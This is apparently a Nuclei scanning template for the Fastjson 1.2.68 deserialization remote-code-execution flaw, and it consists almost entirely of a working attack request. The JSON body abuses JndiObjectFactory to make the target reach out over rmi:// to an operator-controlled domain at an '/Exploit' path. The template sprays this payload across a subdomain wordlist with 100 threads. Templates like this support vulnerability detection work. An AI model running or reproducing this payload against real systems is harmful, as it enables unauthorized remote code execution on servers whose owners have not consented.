id: fastjson-1-2-68-rce-1
info:
  author: zh
  name: Fastjson 1.2.68 Deserialization RCE
  reference:
  - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
  - https://github.com/wyzxxz/fastjson_rce_tool
  severity: critical
  tags: fastjson,rce,deserialization,oast
requests:
- attack: sniper
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - "POST / HTTP/1.1\nHost: {{Subdomains}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;\
    \ Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\n\
    Accept: */*\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\n\n\
    {\n   \"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\n   \"resourceName\"\
    :\"rmi://{{Host}}.{{Port}}.{{Subdomains}}.fastjson.{{MY-DOMAIN}}/Exploit\"\n}"
  threads: 100
